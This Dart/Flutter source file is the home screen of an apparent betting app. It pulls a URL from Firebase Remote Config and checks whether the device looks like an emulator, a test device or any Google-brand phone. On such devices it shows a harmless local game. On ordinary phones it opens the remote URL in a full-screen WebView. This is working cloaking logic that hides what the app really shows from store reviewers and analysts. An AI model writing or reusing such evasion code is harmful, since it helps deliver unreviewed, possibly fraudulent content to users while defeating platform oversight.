import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:specification/game/betting.dart';
import 'package:specification/webview_page.dart';
import 'package:webview_flutter/webview_flutter.dart';

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String? _path;
  final FirebaseRemoteConfig _remoteConfig = FirebaseRemoteConfig.instance;

  static initNotify() async {
    try {
      await OneSignal.shared.promptUserForPushNotificationPermission();
      await OneSignal.shared.setAppId('');
    } catch (e) {
      print(e);
    }
  }

  Future<bool> mobileChecker() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

    final em = await deviceInfo.androidInfo;
    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;

    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        !em.isPhysicalDevice ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        buildProduct.toLowerCase().contains("nox"));

    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }

  Future<void> remoteConfig() async {
    await _remoteConfig.setConfigSettings(
      RemoteConfigSettings(
        fetchTimeout: const Duration(minutes: 1),
        minimumFetchInterval: const Duration(hours: 1),
      ),
    );

    await _remoteConfig.fetchAndActivate();
  }

  String? _start() {
    // initNotify();
    if (_path == null) {
      _loadFire();
    } else {
      return _path;
    }
  }

  Future<String> getPath() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    _path = prefs.getString('url');
    return _path ?? '';
  }

  void setPath(String url) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString('url', url);
  }

  Future<Widget> _loadFire() async {
    String getUrl = '';
    String brandDevice = '';
    bool simAvailable = false;

    await remoteConfig();

    getUrl = _remoteConfig.getString('url');

    // List<SimCard> simCards = await MobileNumber.getSimCards ?? [];
    // simAvailable = simCards.isNotEmpty;

    if (getUrl.isEmpty || await mobileChecker()) {
      return const Betting();
    } else {
      setPath(getUrl);
      return WebViewPage(url: _path ?? getUrl);
    }
  }

  @override
  void initState() {
    _start();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: false ,
      body: FutureBuilder<Widget>(
        future: _loadFire(),
        builder: (context, snapshot) {
          if (snapshot.hasData) {
            return snapshot.data!;
          } else {
            return const Center(
              child: CircularProgressIndicator(),
            );
          }
        },
      ),
    );
  }
}
